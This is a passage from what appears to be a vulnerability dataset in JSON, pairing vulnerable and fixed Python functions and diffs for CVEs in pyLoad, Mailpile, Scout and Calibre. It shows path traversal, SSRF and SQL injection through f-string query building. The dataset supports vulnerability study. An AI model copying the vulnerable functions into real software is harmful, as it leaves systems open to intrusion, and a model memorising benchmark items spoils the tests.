        "snippet": "    def add_package(self, name, links, dest=Destination.QUEUE):\n        \"\"\"\n        Adds a package, with links to desired destination.\n\n        :param name: name of the new package\n        :param links: list of urls\n        :param dest: `Destination`\n        :return: package id of the new package\n        \"\"\"\n        if self.pyload.config.get(\"general\", \"folder_per_package\"):\n            folder = name\n        else:\n            folder = \"\"\n\n        folder = (\n            folder.replace(\"http://\", \"\")\n            .replace(\"https://\", \"\")\n            .replace(\"../\", \"_\")\n            .replace(\"..\\\\\", \"_\")\n            .replace(\":\", \"\")\n            .replace(\"/\", \"_\")\n            .replace(\"\\\\\", \"_\")\n        )\n\n        package_id = self.pyload.files.add_package(name, folder, Destination(dest))\n\n        self.pyload.files.add_links(links, package_id)\n\n        self.pyload.log.info(\n            self._(\"Added package {name} containing {count:d} links\").format(\n                name=name, count=len(links)\n            )\n        )\n\n        self.pyload.files.save()\n\n        return package_id"
      },
      {
        "id": "fix_py_154_2",
        "commit": "695bb70",
        "file_path": "src/pyload/webui/app/blueprints/json_blueprint.py",
        "start_line": 190,
        "end_line": 205,
        "snippet": "def edit_package():\n    api = flask.current_app.config[\"PYLOAD_API\"]\n    try:\n        pack_id = int(flask.request.form[\"pack_id\"])\n        pack_folder = flask.request.form[\"pack_folder\"].lstrip(f\"{os.path.sep}\").replace(f\"..{os.path.sep}\", f\"\")\n        data = {\n            \"name\": flask.request.form[\"pack_name\"],\n            \"_folder\": pack_folder,\n            \"password\": flask.request.form[\"pack_pws\"],\n        }\n\n        api.set_package_data(pack_id, data)\n        return jsonify(response=\"success\")\n\n    except Exception:\n        return jsonify(False), 500"
      }
    ],
    "vul_patch": "--- a/src/pyload/core/api/__init__.py\n+++ b/src/pyload/core/api/__init__.py\n@@ -15,6 +15,8 @@\n         folder = (\n             folder.replace(\"http://\", \"\")\n             .replace(\"https://\", \"\")\n+            .replace(\"../\", \"_\")\n+            .replace(\"..\\\\\", \"_\")\n             .replace(\":\", \"\")\n             .replace(\"/\", \"_\")\n             .replace(\"\\\\\", \"_\")\n\n--- a/src/pyload/webui/app/blueprints/json_blueprint.py\n+++ b/src/pyload/webui/app/blueprints/json_blueprint.py\n@@ -1,14 +1,15 @@\n def edit_package():\n     api = flask.current_app.config[\"PYLOAD_API\"]\n     try:\n-        id = int(flask.request.form[\"pack_id\"])\n+        pack_id = int(flask.request.form[\"pack_id\"])\n+        pack_folder = flask.request.form[\"pack_folder\"].lstrip(f\"{os.path.sep}\").replace(f\"..{os.path.sep}\", f\"\")\n         data = {\n             \"name\": flask.request.form[\"pack_name\"],\n-            \"_folder\": flask.request.form[\"pack_folder\"],\n+            \"_folder\": pack_folder,\n             \"password\": flask.request.form[\"pack_pws\"],\n         }\n \n-        api.set_package_data(id, data)\n+        api.set_package_data(pack_id, data)\n         return jsonify(response=\"success\")\n \n     except Exception:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-20954",
    "cve_description": "The \"Security and Privacy\" Encryption feature in Mailpile before 1.0.0rc4 does not exclude disabled, revoked, and expired keys.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/mailpile/Mailpile",
    "patch_url": [
      "https://github.com/mailpile/Mailpile/commit/49b64f62ade9ade3dff9337c7bbc1171eab3d59e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_146_1",
        "commit": "6199efa",
        "file_path": "mailpile/plugins/crypto_gnupg.py",
        "start_line": 393,
        "end_line": 395,
        "snippet": "    def command(self):\n        res = self._gnupg().list_secret_keys()\n        return self._success(\"Searched for secret keys\", res)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_146_1",
        "commit": "49b64f6",
        "file_path": "mailpile/plugins/crypto_gnupg.py",
        "start_line": 394,
        "end_line": 408,
        "snippet": "    def command(self):\n        args = list(self.args)\n        if len(args) > 0:\n            check = args[0]\n        else:\n            check = self.data.get('check', '')\n        check = 'True' in check\n        \n        all = self._gnupg().list_secret_keys()\n        if check:\n            res = {fprint : all[fprint] for fprint in all\n                if not (all[fprint]['revoked'] or all[fprint]['disabled'])}\n        else:\n            res = all\n        return self._success(\"Searched for secret keys\", res)"
      }
    ],
    "vul_patch": "--- a/mailpile/plugins/crypto_gnupg.py\n+++ b/mailpile/plugins/crypto_gnupg.py\n@@ -1,3 +1,15 @@\n     def command(self):\n-        res = self._gnupg().list_secret_keys()\n+        args = list(self.args)\n+        if len(args) > 0:\n+            check = args[0]\n+        else:\n+            check = self.data.get('check', '')\n+        check = 'True' in check\n+        \n+        all = self._gnupg().list_secret_keys()\n+        if check:\n+            res = {fprint : all[fprint] for fprint in all\n+                if not (all[fprint]['revoked'] or all[fprint]['disabled'])}\n+        else:\n+            res = all\n         return self._success(\"Searched for secret keys\", res)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-1592",
    "cve_description": "Server-Side Request Forgery in scout in GitHub repository clinical-genomics/scout prior to v4.42. An attacker could make the application perform arbitrary requests to fishing steal cookie, request to private area, or lead to xss...",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/clinical-genomics/scout",
    "patch_url": [
      "https://github.com/clinical-genomics/scout/commit/b0ef15f4737d0c801154c1991b52ff5cab4f5c83"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_310_1",
        "commit": "51a838d",
        "file_path": "scout/server/blueprints/alignviewers/controllers.py",
        "start_line": 17,
        "end_line": 30,
        "snippet": "def set_session_tracks(display_obj):\n    \"\"\"Save igv tracks as a session object. This way it's easy to verify that a user is requesting one of these files from remote_static view endpoint\n\n    Args:\n        display_obj(dict): A display object containing case name, list of genes, lucus and tracks\n    \"\"\"\n    session_tracks = list(display_obj.get(\"reference_track\", {}).values())\n    for key, track_items in display_obj.items():\n        if key not in [\"tracks\", \"custom_tracks\", \"sample_tracks\"]:\n            continue\n        for track_item in track_items:\n            session_tracks += list(track_item.values())\n\n    session[\"igv_tracks\"] = session_tracks"
      },
      {
        "id": "vul_py_310_2",
        "commit": "51a838d",
        "file_path": "scout/server/blueprints/alignviewers/views.py",
        "start_line": 34,
        "end_line": 64,
        "snippet": "def remote_cors(remote_url):\n    \"\"\"Proxy a remote URL.\n    Useful to e.g. eliminate CORS issues when the remote site does not\n        communicate CORS headers well, as in cloud tracks on figshare for IGV.js.\n\n    Based on code from answers to this thread:\n        https://stackoverflow.com/questions/6656363/proxying-to-another-web-service-with-flask/\n    \"\"\"\n    resp = requests.request(\n        method=request.method,\n        url=remote_url,\n        headers={key: value for (key, value) in request.headers if key != \"Host\"},\n        data=request.get_data(),\n        cookies=request.cookies,\n        allow_redirects=True,\n    )\n\n    excluded_headers = [\n        \"content-encoding\",\n        \"content-length\",\n        \"transfer-encoding\",\n        \"connection\",\n    ]\n    headers = [\n        (name, value)\n        for (name, value) in resp.raw.headers.items()\n        if name.lower() not in excluded_headers\n    ]\n\n    response = Response(resp.content, resp.status_code, headers)\n    return response"
      },
      {
        "id": "vul_py_310_3",
        "commit": "51a838d",
        "file_path": "scout/server/blueprints/alignviewers/views.py",
        "start_line": 68,
        "end_line": 82,
        "snippet": "def remote_static():\n    \"\"\"Stream *large* static files with special requirements.\"\"\"\n    file_path = request.args.get(\"file\") or \".\"\n\n    # Check that user is logged in or that file extension is valid\n    if current_user.is_authenticated is False or file_path not in session.get(\"igv_tracks\", []):\n        LOG.warning(f\"{file_path} not in {session.get('igv_tracks', [])}\")\n        return abort(403)\n\n    range_header = request.headers.get(\"Range\", None)\n    if not range_header and (file_path.endswith(\".bam\") or file_path.endswith(\".cram\")):\n        return abort(500)\n\n    new_resp = send_file_partial(file_path)\n    return new_resp"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_310_1",
        "commit": "b0ef15f4737d0c801154c1991b52ff5cab4f5c83",
        "file_path": "scout/server/blueprints/alignviewers/controllers.py",
        "start_line": 36,
        "end_line": 49,
        "snippet": "def set_session_tracks(display_obj):\n    \"\"\"Save igv tracks as a session object. This way it's easy to verify that a user is requesting one of these files from remote_static view endpoint\n\n    Args:\n        display_obj(dict): A display object containing case name, list of genes, lucus and tracks\n    \"\"\"\n    session_tracks = list(display_obj.get(\"reference_track\", {}).values())\n    for key, track_items in display_obj.items():\n        if key not in [\"tracks\", \"custom_tracks\", \"sample_tracks\", \"cloud_public_tracks\"]:\n            continue\n        for track_item in track_items:\n            session_tracks += list(track_item.values())\n\n    session[\"igv_tracks\"] = session_tracks"
      },
      {
        "id": "fix_py_310_2",
        "commit": "b0ef15f4737d0c801154c1991b52ff5cab4f5c83",
        "file_path": "scout/server/blueprints/alignviewers/views.py",
        "start_line": 34,
        "end_line": 68,
        "snippet": "def remote_cors(remote_url):\n    \"\"\"Proxy a remote URL.\n    Useful to e.g. eliminate CORS issues when the remote site does not\n        communicate CORS headers well, as in cloud tracks on figshare for IGV.js.\n\n    Based on code from answers to this thread:\n        https://stackoverflow.com/questions/6656363/proxying-to-another-web-service-with-flask/\n    \"\"\"\n    # Check that user is logged in or that file extension is valid\n    if controllers.check_session_tracks(remote_url) is False:\n        return abort(403)\n\n    resp = requests.request(\n        method=request.method,\n        url=remote_url,\n        headers={key: value for (key, value) in request.headers if key != \"Host\"},\n        data=request.get_data(),\n        cookies=request.cookies,\n        allow_redirects=True,\n    )\n\n    excluded_headers = [\n        \"content-encoding\",\n        \"content-length\",\n        \"transfer-encoding\",\n        \"connection\",\n    ]\n    headers = [\n        (name, value)\n        for (name, value) in resp.raw.headers.items()\n        if name.lower() not in excluded_headers\n    ]\n\n    response = Response(resp.content, resp.status_code, headers)\n    return response"
      },
      {
        "id": "fix_py_310_3",
        "commit": "b0ef15f4737d0c801154c1991b52ff5cab4f5c83",
        "file_path": "scout/server/blueprints/alignviewers/views.py",
        "start_line": 72,
        "end_line": 85,
        "snippet": "def remote_static():\n    \"\"\"Stream *large* static files with special requirements.\"\"\"\n    file_path = request.args.get(\"file\") or \".\"\n\n    # Check that user is logged in or that file extension is valid\n    if controllers.check_session_tracks(file_path) is False:\n        return abort(403)\n\n    range_header = request.headers.get(\"Range\", None)\n    if not range_header and (file_path.endswith(\".bam\") or file_path.endswith(\".cram\")):\n        return abort(500)\n\n    new_resp = send_file_partial(file_path)\n    return new_resp"
      },
      {
        "id": "fix_py_310_4",
        "commit": "b0ef15f4737d0c801154c1991b52ff5cab4f5c83",
        "file_path": "scout/server/blueprints/alignviewers/controllers.py",
        "start_line": 17,
        "end_line": 35,
        "snippet": "def check_session_tracks(resource):\n    \"\"\"Make sure that a user requesting a resource is authenticated and resource is in session IGV tracks\n\n    Args:\n        resource(str): a resource on the server or on a remote URL\n\n    Returns\n        True is user has access to resource else False\n    \"\"\"\n    # Check that user is logged in or that file extension is valid\n    if current_user.is_authenticated is False:\n        LOG.warning(\"Unauthenticated user requesting resource via remote_static\")\n        return False\n    if resource not in session.get(\"igv_tracks\", []):\n        LOG.warning(f\"{resource} not in {session.get('igv_tracks', [])}\")\n        return False\n    return True\n\n"
      }
    ],
    "vul_patch": "--- a/scout/server/blueprints/alignviewers/controllers.py\n+++ b/scout/server/blueprints/alignviewers/controllers.py\n@@ -6,7 +6,7 @@\n     \"\"\"\n     session_tracks = list(display_obj.get(\"reference_track\", {}).values())\n     for key, track_items in display_obj.items():\n-        if key not in [\"tracks\", \"custom_tracks\", \"sample_tracks\"]:\n+        if key not in [\"tracks\", \"custom_tracks\", \"sample_tracks\", \"cloud_public_tracks\"]:\n             continue\n         for track_item in track_items:\n             session_tracks += list(track_item.values())\n\n--- a/scout/server/blueprints/alignviewers/views.py\n+++ b/scout/server/blueprints/alignviewers/views.py\n@@ -6,6 +6,10 @@\n     Based on code from answers to this thread:\n         https://stackoverflow.com/questions/6656363/proxying-to-another-web-service-with-flask/\n     \"\"\"\n+    # Check that user is logged in or that file extension is valid\n+    if controllers.check_session_tracks(remote_url) is False:\n+        return abort(403)\n+\n     resp = requests.request(\n         method=request.method,\n         url=remote_url,\n\n--- a/scout/server/blueprints/alignviewers/views.py\n+++ b/scout/server/blueprints/alignviewers/views.py\n@@ -3,8 +3,7 @@\n     file_path = request.args.get(\"file\") or \".\"\n \n     # Check that user is logged in or that file extension is valid\n-    if current_user.is_authenticated is False or file_path not in session.get(\"igv_tracks\", []):\n-        LOG.warning(f\"{file_path} not in {session.get('igv_tracks', [])}\")\n+    if controllers.check_session_tracks(file_path) is False:\n         return abort(403)\n \n     range_header = request.headers.get(\"Range\", None)\n\n--- /dev/null\n+++ b/scout/server/blueprints/alignviewers/views.py\n@@ -0,0 +1,18 @@\n+def check_session_tracks(resource):\n+    \"\"\"Make sure that a user requesting a resource is authenticated and resource is in session IGV tracks\n+\n+    Args:\n+        resource(str): a resource on the server or on a remote URL\n+\n+    Returns\n+        True is user has access to resource else False\n+    \"\"\"\n+    # Check that user is logged in or that file extension is valid\n+    if current_user.is_authenticated is False:\n+        LOG.warning(\"Unauthenticated user requesting resource via remote_static\")\n+        return False\n+    if resource not in session.get(\"igv_tracks\", []):\n+        LOG.warning(f\"{resource} not in {session.get('igv_tracks', [])}\")\n+        return False\n+    return True\n+\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-7009",
    "cve_description": "Unsanitized user-input in Calibre <= 7.15.0 allow users with permissions to perform full-text searches to achieve SQL injection on the SQLite database.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/kovidgoyal/calibre",
    "patch_url": [
      "https://github.com/kovidgoyal/calibre/commit/d56574285e8859d3d715eb7829784ee74337b7d7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_173_1",
        "commit": "bcd0ab1",
        "file_path": "src/calibre/db/backend.py",
        "start_line": 2361,
        "end_line": 2408,
        "snippet": "    def search_annotations(self,\n        fts_engine_query, use_stemming, highlight_start, highlight_end, snippet_size, annotation_type,\n        restrict_to_book_ids, restrict_to_user, ignore_removed=False\n    ):\n        fts_engine_query = unicode_normalize(fts_engine_query)\n        fts_table = 'annotations_fts_stemmed' if use_stemming else 'annotations_fts'\n        text = 'annotations.searchable_text'\n        if highlight_start is not None and highlight_end is not None:\n            if snippet_size is not None:\n                text = \"snippet({fts_table}, 0, '{highlight_start}', '{highlight_end}', '\\u2026', {snippet_size})\".format(\n                        fts_table=fts_table, highlight_start=highlight_start, highlight_end=highlight_end,\n                        snippet_size=max(1, min(snippet_size, 64)))\n            else:\n                text = f\"highlight({fts_table}, 0, '{highlight_start}', '{highlight_end}')\"\n        query = 'SELECT {0}.id, {0}.book, {0}.format, {0}.user_type, {0}.user, {0}.annot_data, {1} FROM {0} '\n        query = query.format('annotations', text)\n        query += ' JOIN {fts_table} ON annotations.id = {fts_table}.rowid'.format(fts_table=fts_table)\n        query += f' WHERE {fts_table} MATCH ?'\n        data = [fts_engine_query]\n        if restrict_to_user:\n            query += ' AND annotations.user_type = ? AND annotations.user = ?'\n            data += list(restrict_to_user)\n        if annotation_type:\n            query += ' AND annotations.annot_type = ? '\n            data.append(annotation_type)\n        query += f' ORDER BY {fts_table}.rank '\n        ls = json.loads\n        try:\n            for (rowid, book_id, fmt, user_type, user, annot_data, text) in self.execute(query, tuple(data)):\n                if restrict_to_book_ids is not None and book_id not in restrict_to_book_ids:\n                    continue\n                try:\n                    parsed_annot = ls(annot_data)\n                except Exception:\n                    continue\n                if ignore_removed and parsed_annot.get('removed'):\n                    continue\n                yield {\n                    'id': rowid,\n                    'book_id': book_id,\n                    'format': fmt,\n                    'user_type': user_type,\n                    'user': user,\n                    'text': text,\n                    'annotation': parsed_annot,\n                }\n        except apsw.SQLError as e:\n            raise FTSQueryError(fts_engine_query, query, e)"
      },
      {
        "id": "vul_py_173_2",
        "commit": "bcd0ab1",
        "file_path": "src/calibre/db/fts/connect.py",
        "start_line": 151,
        "end_line": 199,
        "snippet": "    def search(self,\n        fts_engine_query, use_stemming, highlight_start, highlight_end, snippet_size, restrict_to_book_ids,\n        return_text=True, process_each_result=None\n    ):\n        if restrict_to_book_ids is not None and not restrict_to_book_ids:\n            return\n        fts_engine_query = unicode_normalize(fts_engine_query)\n        fts_table = 'books_fts' + ('_stemmed' if use_stemming else '')\n        if return_text:\n            text = 'books_text.searchable_text'\n            if highlight_start is not None and highlight_end is not None:\n                if snippet_size is not None:\n                    text = f'''snippet(\"{fts_table}\", 0, '{highlight_start}', '{highlight_end}', '\\u2026', {max(1, min(snippet_size, 64))})'''\n                else:\n                    text = f'''highlight(\"{fts_table}\", 0, '{highlight_start}', '{highlight_end}')'''\n            text = ', ' + text\n        else:\n            text = ''\n        query = 'SELECT {0}.id, {0}.book, {0}.format {1} FROM {0} '.format('books_text', text)\n        query += f' JOIN {fts_table} ON fts_db.books_text.id = {fts_table}.rowid'\n        query += ' WHERE '\n        data = []\n        conn = self.get_connection()\n        temp_table_name = ''\n        if restrict_to_book_ids:\n            temp_table_name = f'fts_restrict_search_{next(self.temp_table_counter)}'\n            conn.execute(f'CREATE TABLE temp.{temp_table_name}(x INTEGER)')\n            conn.executemany(f'INSERT INTO temp.{temp_table_name} VALUES (?)', tuple((x,) for x in restrict_to_book_ids))\n            query += f' fts_db.books_text.book IN temp.{temp_table_name} AND '\n        query += f' \"{fts_table}\" MATCH ?'\n        data.append(fts_engine_query)\n        query += f' ORDER BY {fts_table}.rank '\n        if temp_table_name:\n            query += f'; DROP TABLE temp.{temp_table_name}'\n        try:\n            for record in conn.execute(query, tuple(data)):\n                result = {\n                    'id': record[0],\n                    'book_id': record[1],\n                    'format': record[2],\n                    'text': record[3] if return_text else '',\n                }\n                if process_each_result is not None:\n                    result = process_each_result(result)\n                ret = yield result\n                if ret is True:\n                    break\n        except apsw.SQLError as e:\n            raise FTSQueryError(fts_engine_query, query, e) from e"
      },
      {
        "id": "vul_py_173_3",
        "commit": "bcd0ab1",
        "file_path": "src/calibre/db/notes/connect.py",
        "start_line": 406,
        "end_line": 449,
        "snippet": "    def search(self,\n        conn, fts_engine_query, use_stemming, highlight_start, highlight_end, snippet_size, restrict_to_fields=(),\n        return_text=True, process_each_result=None, limit=None\n    ):\n        if not fts_engine_query:\n            yield from self.all_notes(\n                conn, restrict_to_fields, limit=limit, snippet_size=snippet_size, return_text=return_text, process_each_result=process_each_result)\n            return\n        fts_engine_query = unicode_normalize(fts_engine_query)\n        fts_table = 'notes_fts' + ('_stemmed' if use_stemming else '')\n        if return_text:\n            text = 'notes.searchable_text'\n            if highlight_start is not None and highlight_end is not None:\n                if snippet_size is not None:\n                    text = f'''snippet(\"{fts_table}\", 0, '{highlight_start}', '{highlight_end}', '\\u2026', {max(1, min(snippet_size, 64))})'''\n                else:\n                    text = f'''highlight(\"{fts_table}\", 0, '{highlight_start}', '{highlight_end}')'''\n            text = ', ' + text\n        else:\n            text = ''\n        query = 'SELECT {0}.id, {0}.colname, {0}.item {1} FROM {0} '.format('notes', text)\n        query += f' JOIN {fts_table} ON notes_db.notes.id = {fts_table}.rowid'\n        query += ' WHERE '\n        if restrict_to_fields:\n            query += ' notes_db.notes.colname IN ({}) AND '.format(','.join(repeat('?', len(restrict_to_fields))))\n        query += f' \"{fts_table}\" MATCH ?'\n        query += f' ORDER BY {fts_table}.rank '\n        if limit is not None:\n            query += f' LIMIT {limit}'\n        try:\n            for record in conn.execute(query, restrict_to_fields+(fts_engine_query,)):\n                result = {\n                    'id': record[0],\n                    'field': record[1],\n                    'item_id': record[2],\n                    'text': record[3] if return_text else '',\n                }\n                if process_each_result is not None:\n                    result = process_each_result(result)\n                ret = yield result\n                if ret is True:\n                    break\n        except apsw.SQLError as e:\n            raise FTSQueryError(fts_engine_query, query, e) from e"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_173_1",
        "commit": "d565742",
        "file_path": "src/calibre/db/backend.py",
        "start_line": 2361,
        "end_line": 2410,
        "snippet": "    def search_annotations(self,\n        fts_engine_query, use_stemming, highlight_start, highlight_end, snippet_size, annotation_type,\n        restrict_to_book_ids, restrict_to_user, ignore_removed=False\n    ):\n        fts_engine_query = unicode_normalize(fts_engine_query)\n        fts_table = 'annotations_fts_stemmed' if use_stemming else 'annotations_fts'\n        text = 'annotations.searchable_text'\n        data = []\n        if highlight_start is not None and highlight_end is not None:\n            if snippet_size is not None:\n                text = \"snippet({fts_table}, 0, ?, ?, '\\u2026', {snippet_size})\".format(\n                        fts_table=fts_table, snippet_size=max(1, min(snippet_size, 64)))\n            else:\n                text = f\"highlight({fts_table}, 0, ?, ?)\"\n            data.append(highlight_start)\n            data.append(highlight_end)\n        query = 'SELECT {0}.id, {0}.book, {0}.format, {0}.user_type, {0}.user, {0}.annot_data, {1} FROM {0} '\n        query = query.format('annotations', text)\n        query += ' JOIN {fts_table} ON annotations.id = {fts_table}.rowid'.format(fts_table=fts_table)\n        query += f' WHERE {fts_table} MATCH ?'\n        data.append(fts_engine_query)\n        if restrict_to_user:\n            query += ' AND annotations.user_type = ? AND annotations.user = ?'\n            data += list(restrict_to_user)\n        if annotation_type:\n            query += ' AND annotations.annot_type = ? '\n            data.append(annotation_type)\n        query += f' ORDER BY {fts_table}.rank '\n        ls = json.loads\n        try:\n            for (rowid, book_id, fmt, user_type, user, annot_data, text) in self.execute(query, tuple(data)):\n                if restrict_to_book_ids is not None and book_id not in restrict_to_book_ids:\n                    continue\n                try:\n                    parsed_annot = ls(annot_data)\n                except Exception:\n                    continue\n                if ignore_removed and parsed_annot.get('removed'):\n                    continue\n                yield {\n                    'id': rowid,\n                    'book_id': book_id,\n                    'format': fmt,\n                    'user_type': user_type,\n                    'user': user,\n                    'text': text,\n                    'annotation': parsed_annot,\n                }\n        except apsw.SQLError as e:\n            raise FTSQueryError(fts_engine_query, query, e)"
      },
      {
        "id": "fix_py_173_2",
        "commit": "d565742",
        "file_path": "src/calibre/db/fts/connect.py",
        "start_line": 151,
        "end_line": 201,
        "snippet": "    def search(self,\n        fts_engine_query, use_stemming, highlight_start, highlight_end, snippet_size, restrict_to_book_ids,\n        return_text=True, process_each_result=None\n    ):\n        if restrict_to_book_ids is not None and not restrict_to_book_ids:\n            return\n        fts_engine_query = unicode_normalize(fts_engine_query)\n        fts_table = 'books_fts' + ('_stemmed' if use_stemming else '')\n        data = []\n        if return_text:\n            text = 'books_text.searchable_text'\n            if highlight_start is not None and highlight_end is not None:\n                if snippet_size is not None:\n                    text = f'''snippet(\"{fts_table}\", 0, ?, ?, '\\u2026', {max(1, min(snippet_size, 64))})'''\n                else:\n                    text = f'''highlight(\"{fts_table}\", 0, ?, ?)'''\n                data.append(highlight_start)\n                data.append(highlight_end)\n            text = ', ' + text\n        else:\n            text = ''\n        query = 'SELECT {0}.id, {0}.book, {0}.format {1} FROM {0} '.format('books_text', text)\n        query += f' JOIN {fts_table} ON fts_db.books_text.id = {fts_table}.rowid'\n        query += ' WHERE '\n        conn = self.get_connection()\n        temp_table_name = ''\n        if restrict_to_book_ids:\n            temp_table_name = f'fts_restrict_search_{next(self.temp_table_counter)}'\n            conn.execute(f'CREATE TABLE temp.{temp_table_name}(x INTEGER)')\n            conn.executemany(f'INSERT INTO temp.{temp_table_name} VALUES (?)', tuple((x,) for x in restrict_to_book_ids))\n            query += f' fts_db.books_text.book IN temp.{temp_table_name} AND '\n        query += f' \"{fts_table}\" MATCH ?'\n        data.append(fts_engine_query)\n        query += f' ORDER BY {fts_table}.rank '\n        if temp_table_name:\n            query += f'; DROP TABLE temp.{temp_table_name}'\n        try:\n            for record in conn.execute(query, tuple(data)):\n                result = {\n                    'id': record[0],\n                    'book_id': record[1],\n                    'format': record[2],\n                    'text': record[3] if return_text else '',\n                }\n                if process_each_result is not None:\n                    result = process_each_result(result)\n                ret = yield result\n                if ret is True:\n                    break\n        except apsw.SQLError as e:\n            raise FTSQueryError(fts_engine_query, query, e) from e"
      },
      {
        "id": "fix_py_173_3",
        "commit": "d565742",
        "file_path": "src/calibre/db/notes/connect.py",
        "start_line": 406,
        "end_line": 451,
        "snippet": "    def search(self,\n        conn, fts_engine_query, use_stemming, highlight_start, highlight_end, snippet_size, restrict_to_fields=(),\n        return_text=True, process_each_result=None, limit=None\n    ):\n        if not fts_engine_query:\n            yield from self.all_notes(\n                conn, restrict_to_fields, limit=limit, snippet_size=snippet_size, return_text=return_text, process_each_result=process_each_result)\n            return\n        fts_engine_query = unicode_normalize(fts_engine_query)\n        fts_table = 'notes_fts' + ('_stemmed' if use_stemming else '')\n        hl_data = ()\n        if return_text:\n            text = 'notes.searchable_text'\n            if highlight_start is not None and highlight_end is not None:\n                if snippet_size is not None:\n                    text = f'''snippet(\"{fts_table}\", 0, ?, ?, '\\u2026', {max(1, min(snippet_size, 64))})'''\n                else:\n                    text = f'''highlight(\"{fts_table}\", 0, ?, ?)'''\n                hl_data = (highlight_start, highlight_end)\n            text = ', ' + text\n        else:\n            text = ''\n        query = 'SELECT {0}.id, {0}.colname, {0}.item {1} FROM {0} '.format('notes', text)\n        query += f' JOIN {fts_table} ON notes_db.notes.id = {fts_table}.rowid'\n        query += ' WHERE '\n        if restrict_to_fields:\n            query += ' notes_db.notes.colname IN ({}) AND '.format(','.join(repeat('?', len(restrict_to_fields))))\n        query += f' \"{fts_table}\" MATCH ?'\n        query += f' ORDER BY {fts_table}.rank '\n        if limit is not None:\n            query += f' LIMIT {limit}'\n        try:\n            for record in conn.execute(query, hl_data + restrict_to_fields + (fts_engine_query,)):\n                result = {\n                    'id': record[0],\n                    'field': record[1],\n                    'item_id': record[2],\n                    'text': record[3] if return_text else '',\n                }\n                if process_each_result is not None:\n                    result = process_each_result(result)\n                ret = yield result\n                if ret is True:\n                    break\n        except apsw.SQLError as e:\n            raise FTSQueryError(fts_engine_query, query, e) from e"
      }
    ],
    "vul_patch": "--- a/src/calibre/db/backend.py\n+++ b/src/calibre/db/backend.py\n@@ -5,18 +5,20 @@\n         fts_engine_query = unicode_normalize(fts_engine_query)\n         fts_table = 'annotations_fts_stemmed' if use_stemming else 'annotations_fts'\n         text = 'annotations.searchable_text'\n+        data = []\n         if highlight_start is not None and highlight_end is not None:\n             if snippet_size is not None:\n-                text = \"snippet({fts_table}, 0, '{highlight_start}', '{highlight_end}', '\\u2026', {snippet_size})\".format(\n-                        fts_table=fts_table, highlight_start=highlight_start, highlight_end=highlight_end,\n-                        snippet_size=max(1, min(snippet_size, 64)))\n+                text = \"snippet({fts_table}, 0, ?, ?, '\\u2026', {snippet_size})\".format(\n+                        fts_table=fts_table, snippet_size=max(1, min(snippet_size, 64)))\n             else:\n-                text = f\"highlight({fts_table}, 0, '{highlight_start}', '{highlight_end}')\"\n+                text = f\"highlight({fts_table}, 0, ?, ?)\"\n+            data.append(highlight_start)\n+            data.append(highlight_end)\n         query = 'SELECT {0}.id, {0}.book, {0}.format, {0}.user_type, {0}.user, {0}.annot_data, {1} FROM {0} '\n         query = query.format('annotations', text)\n         query += ' JOIN {fts_table} ON annotations.id = {fts_table}.rowid'.format(fts_table=fts_table)\n         query += f' WHERE {fts_table} MATCH ?'\n-        data = [fts_engine_query]\n+        data.append(fts_engine_query)\n         if restrict_to_user:\n             query += ' AND annotations.user_type = ? AND annotations.user = ?'\n             data += list(restrict_to_user)\n\n--- a/src/calibre/db/fts/connect.py\n+++ b/src/calibre/db/fts/connect.py\n@@ -6,20 +6,22 @@\n             return\n         fts_engine_query = unicode_normalize(fts_engine_query)\n         fts_table = 'books_fts' + ('_stemmed' if use_stemming else '')\n+        data = []\n         if return_text:\n             text = 'books_text.searchable_text'\n             if highlight_start is not None and highlight_end is not None:\n                 if snippet_size is not None:\n-                    text = f'''snippet(\"{fts_table}\", 0, '{highlight_start}', '{highlight_end}', '\\u2026', {max(1, min(snippet_size, 64))})'''\n+                    text = f'''snippet(\"{fts_table}\", 0, ?, ?, '\\u2026', {max(1, min(snippet_size, 64))})'''\n                 else:\n-                    text = f'''highlight(\"{fts_table}\", 0, '{highlight_start}', '{highlight_end}')'''\n+                    text = f'''highlight(\"{fts_table}\", 0, ?, ?)'''\n+                data.append(highlight_start)\n+                data.append(highlight_end)\n             text = ', ' + text\n         else:\n             text = ''\n         query = 'SELECT {0}.id, {0}.book, {0}.format {1} FROM {0} '.format('books_text', text)\n         query += f' JOIN {fts_table} ON fts_db.books_text.id = {fts_table}.rowid'\n         query += ' WHERE '\n-        data = []\n         conn = self.get_connection()\n         temp_table_name = ''\n         if restrict_to_book_ids:\n\n--- a/src/calibre/db/notes/connect.py\n+++ b/src/calibre/db/notes/connect.py\n@@ -8,13 +8,15 @@\n             return\n         fts_engine_query = unicode_normalize(fts_engine_query)\n         fts_table = 'notes_fts' + ('_stemmed' if use_stemming else '')\n+        hl_data = ()\n         if return_text:\n             text = 'notes.searchable_text'\n             if highlight_start is not None and highlight_end is not None:\n                 if snippet_size is not None:\n-                    text = f'''snippet(\"{fts_table}\", 0, '{highlight_start}', '{highlight_end}', '\\u2026', {max(1, min(snippet_size, 64))})'''\n+                    text = f'''snippet(\"{fts_table}\", 0, ?, ?, '\\u2026', {max(1, min(snippet_size, 64))})'''\n                 else:\n-                    text = f'''highlight(\"{fts_table}\", 0, 